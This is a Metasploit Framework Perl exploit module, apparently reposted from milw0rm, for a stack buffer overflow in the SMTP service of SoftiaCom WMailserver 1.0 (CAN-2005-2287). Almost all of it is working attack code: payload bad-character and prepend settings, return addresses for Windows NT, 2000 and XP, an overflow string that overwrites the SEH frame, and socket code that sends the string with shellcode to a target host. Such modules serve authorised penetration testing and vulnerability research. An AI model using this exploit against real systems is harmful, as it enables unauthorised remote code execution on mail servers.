##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wmailserver_smtp;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'     => 'SoftiaCom WMailserver 1.0 SMTP Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'win2000', 'winxp' ],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 25],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	'Payload' =>
	  {
		'Space'     => 600,
		'BadChars'  => "\x00\x0a\x0d\x20:=+\x22",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in SoftiaCom WMailserver 1.0 (SMTP)
	via a SEH frame overwrite.
}),

	'Refs'  =>
	  [
		['CVE', 'CAN-2005-2287'],
		['BID', '14213'],
	  ],
	'Targets' =>
	  [
		['Windows NT 4.0 English SP4/SP5/SP6', 0x776a1799],
		['Windows 2000 English ALL', 0x75022ac4],
		['Windows XP English SP0/SP1', 0x71aa32ad],
	  ],
	'Keys' => ['smtp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $splat  = Pex::Text::UpperCaseText(5117);

	my $sploit =
	  " ". $splat. "\xeb\x06". pack('V', $target->[1]).
	  $shellcode. "\r\n\r\n";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;

# milw0rm.com [2006-02-01]